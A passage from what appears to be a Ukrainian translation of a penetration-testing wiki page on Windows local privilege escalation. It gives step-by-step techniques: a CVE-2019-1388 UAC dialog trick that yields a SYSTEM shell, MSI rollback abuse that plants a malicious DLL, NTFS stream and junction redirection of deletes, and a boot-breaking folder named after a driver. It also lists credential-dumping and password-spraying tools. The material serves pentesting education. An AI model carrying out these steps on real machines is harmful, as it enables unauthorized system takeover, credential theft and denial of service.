Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Щоб експлуатувати цю вразливість, необхідно виконати наступні кроки:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Ви маєте всі необхідні файли та інформацію у наступному репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388

## Від Administrator Medium до High Integrity Level / UAC Bypass

Прочитайте це, щоб дізнатися про Integrity Levels:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім прочитайте це, щоб дізнатися про UAC та UAC bypasses:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Від Arbitrary Folder Delete/Move/Rename до SYSTEM EoP

Техніка, описана в цьому [**блозі**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) з кодом експлойту [**доступним тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Атака в основному полягає в зловживанні функцією rollback Windows Installer для заміни легітимних файлів на шкідливі під час процесу деінсталяції. Для цього атакуючому потрібно створити **шкідливий MSI інсталятор**, який буде використовуватися для захоплення папки `C:\Config.Msi`, яка пізніше буде використовуватися Windows Installer для збереження файлів rollback під час деінсталяції інших MSI-пакетів, де файли rollback будуть змінені, щоб містити шкідливий payload.

Стислий опис техніки:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Створіть `.msi`, який встановлює нешкідливий файл (наприклад, `dummy.txt`) у записувану папку (`TARGETDIR`).
- Позначте інсталятор як **"UAC Compliant"**, щоб **non-admin user** міг його запускати.
- Після інсталяції тримайте відкритий **handle** до файлу.

- Step 2: Begin Uninstall
- Деінсталюйте той самий `.msi`.
- Процес деінсталяції починає переміщувати файли до `C:\Config.Msi` і перейменовувати їх у файли з розширенням `.rbf` (rollback backups).
- **Опитуйте відкритий handle** за допомогою `GetFinalPathNameByHandle`, щоб виявити момент, коли файл стане `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` включає **custom uninstall action (`SyncOnRbfWritten`)**, яка:
- Сигналізує, коли `.rbf` записано.
- Потім **чекає** на іншу подію перед продовженням деінсталяції.

- Step 4: Block Deletion of `.rbf`
- Коли отримано сигнал, **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **перешкоджає його видаленню**.
- Потім **відправте сигнал назад**, щоб деінсталяція могла завершитись.
- Windows Installer не може видалити `.rbf`, і оскільки він не може видалити весь вміст, **`C:\Config.Msi` не видаляється**.

- Step 5: Manually Delete `.rbf`
- Ви (атакуючий) вручну видаляєте файл `.rbf`.
- Тепер **`C:\Config.Msi` порожня**, готова до захоплення.

> На цьому етапі **trigger the SYSTEM-level arbitrary folder delete vulnerability** для видалення `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Відтворіть папку `C:\Config.Msi` самостійно.
- Встановіть **слабкі DACLs** (наприклад, Everyone:F), і **тримайте відкритий handle** з `WRITE_DAC`.

- Step 7: Run Another Install
- Інсталюйте `.msi` знову, з:
- `TARGETDIR`: записувана локація.
- `ERROROUT`: змінна, що викликає навмисну помилку.
- Ця інсталяція буде використана для повторного виклику **rollback**, який читає `.rbs` і `.rbf`.

- Step 8: Monitor for `.rbs`
- Використайте `ReadDirectoryChangesW` для моніторингу `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
- Зафіксуйте його ім’я файлу.

- Step 9: Sync Before Rollback
- `.msi` містить **custom install action (`SyncBeforeRollback`)**, яка:
- Сигналізує подію при створенні `.rbs`.
- Потім **чекає** перед продовженням.

- Step 10: Reapply Weak ACL
- Після отримання події «`.rbs created`»:
- Windows Installer **заново застосовує сильні ACL** до `C:\Config.Msi`.
- Але оскільки у вас ще є handle з `WRITE_DAC`, ви можете **заново застосувати слабкі ACL** знову.

> ACL застосовуються **тільки під час відкриття handle**, тож ви все ще можете записувати до папки.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Перезапишіть файл `.rbs` фейковим rollback-скриптом, який наказує Windows:
- Відновити ваш `.rbf` (шкідливий DLL) у **привілейовану локацію** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Помістити ваш фейковий `.rbf`, що містить **шкідливий SYSTEM-рівневий payload DLL**.

- Step 12: Trigger the Rollback
- Сигналізуйте sync-подію, щоб інсталятор продовжив роботу.
- Налаштовано **type 19 custom action (`ErrorOut`)**, щоб **навмисно провалити інсталяцію** у відомій точці.
- Це спричиняє початок **rollback**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Читає ваш шкідливий `.rbs`.
- Копіює ваш `.rbf` DLL у цільове розташування.
- Тепер у вас є **шкідливий DLL у шляху, що завантажується як SYSTEM**.

- Final Step: Execute SYSTEM Code
- Запустіть довірений **auto-elevated binary** (наприклад, `osk.exe`), який завантажує DLL, яку ви підмінили.
- **Boom**: ваш код виконується **як SYSTEM**.


### Від Arbitrary File Delete/Move/Rename до SYSTEM EoP

Головна MSI rollback техніка (попередня) припускає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша вразливість дозволяє тільки **довільне видалення файлу**?

Ви можете експлуатувати внутрішні механізми NTFS: кожна папка має прихований alternate data stream під назвою:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Цей потік зберігає **метадані індексу** папки.

Отже, якщо ви **видалите потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить всю папку** з файлової системи.

Цього можна досягти, використовуючи стандартні API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Навіть якщо ви викликаєте API видалення *файлу*, воно **видаляє саму папку**.

### Від Folder Contents Delete до SYSTEM EoP
Що якщо ваш примітив не дозволяє видаляти довільні файли/папки, але він **дозволяє видалення *вмісту* папки, контрольованої зловмисником**?

1. Крок 1: Налаштуйте папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- Цей oplock **призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **oplock спрацьовує** і передає контроль вашому callback.

4. Крок 4: Усередині oplock callback – перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
- Це очищує `folder1`, не порушуючи oplock.
- Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Варіант C: Створити **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Це націлене на внутрішній потік NTFS, який зберігає метадані папки — його видалення видаляє папку.

5. Крок 5: Звільнення oplock
- Процес SYSTEM продовжує працювати і намагається видалити `file1.txt`.
- Але тепер, через junction + symlink, фактично видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Результат**: `C:\Config.Msi` видаляється SYSTEM.

### Від Arbitrary Folder Create до постійного DoS

Скористайтеся примітивом, що дозволяє вам **create an arbitrary folder as SYSTEM/admin** — навіть якщо **you can’t write files** або **set weak permissions**.

Створіть **folder** (не **file**) з назвою **critical Windows driver**, наприклад:
```
C:\Windows\System32\cng.sys
```
- Цей шлях зазвичай відповідає драйверу в режимі ядра `cng.sys`.
- Якщо ви **попередньо створите його як папку**, Windows не зможе завантажити фактичний драйвер під час завантаження.
- Потім Windows намагається завантажити `cng.sys` під час завантаження.
- Windows бачить папку, **не може знайти фактичний драйвер**, і **зависає або припиняє завантаження**.
- Немає **резервного варіанту**, і **відновлення неможливе** без зовнішнього втручання (наприклад, ремонт завантаження або доступ до диска).


## **Від High Integrity до SYSTEM**

### **Нова служба**

Якщо ви вже працюєте в процесі High Integrity, **шлях до SYSTEM** може бути простим — просто **створити та запустити нову службу**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Коли створюєте service binary, переконайтеся, що це дійсна служба або що бінарний файл виконує необхідні дії достатньо швидко, оскільки його буде зупинено через 20s, якщо це не дійсна служба.

### AlwaysInstallElevated

З процесу High Integrity можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell, використовуючи _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Якщо у вас є ці права токена (ймовірно ви знайдете їх у вже High Integrity процесі), ви зможете **відкрити майже будь-який процес** (не захищені процеси) з привілеєм SeDebug, **скопіювати токен** процесу та створити **довільний процес з цим токеном**.\
Зазвичай для цієї техніки **обирають будь-який процес, що працює під SYSTEM з усіма привілеями токена** (_так, можна знайти SYSTEM процеси без усіх привілеїв токена_).\
**Ви можете знайти** [**приклад коду, що реалізує запропоновану техніку тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ця техніка використовується meterpreter для ескалації в `getsystem`. Техніка полягає у **створенні pipe та подальшому створенні/зловживанні сервісом, щоб записати в цей pipe**. Потім **сервер**, який створив pipe використовуючи привілей **`SeImpersonate`**, зможе **імперсонувати токен** клієнта pipe (сервісу), отримавши привілеї SYSTEM.\
Якщо ви хочете [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
Якщо ви хочете прочитати приклад [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **hijack a dll**, яка **завантажується** процесом, що працює як **SYSTEM**, ви зможете виконувати довільний код з цими правами. Отже Dll Hijacking також корисний для такого виду ескалації привілеїв, і, більш того, набагато **легше досяжний з high integrity process**, оскільки він матиме **права на запис** у папки, що використовуються для завантаження dll.\
**Ви можете** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Читати:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Більше допомоги

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Найкращий інструмент для пошуку векторів Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє на неправильні налаштування та чутливі файли (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє на можливі неправильні налаштування та збирає інформацію (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє на неправильні налаштування**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію про сесії PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough під час локального запуску.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявлено.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Застосовує зібрані паролі по всьому домену**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — PowerShell інструмент для підміни ADIDNS/LLMNR/mDNS/NBNS та man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базова енумерація Windows для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Пошук відомих privesc вразливостей (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Шукає відомі privesc вразливості (потрібно компілювати за допомогою VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перелічує хост у пошуках неправильних налаштувань (більше інструмент збору інформації ніж privesc) (потрібно компілювати) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (precompiled exe в GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Перевірка на неправильні налаштування (виконуваний файл precompiled в GitHub). Не рекомендовано. Погано працює в Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих неправильних налаштувань (exe з python). Не рекомендовано. Погано працює в Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент створений на основі цього посту (не потребує accesschk для коректної роботи, але може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вивід **systeminfo** та рекомендує працюючі експлойти (локальний python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вивід **systeminfo** та рекомендує працюючі експлойти (локальний python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Потрібно скомпілювати проект, використовуючи правильну версію .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб побачити встановлену версію .NET на хості жертви, ви можете зробити:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Посилання

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
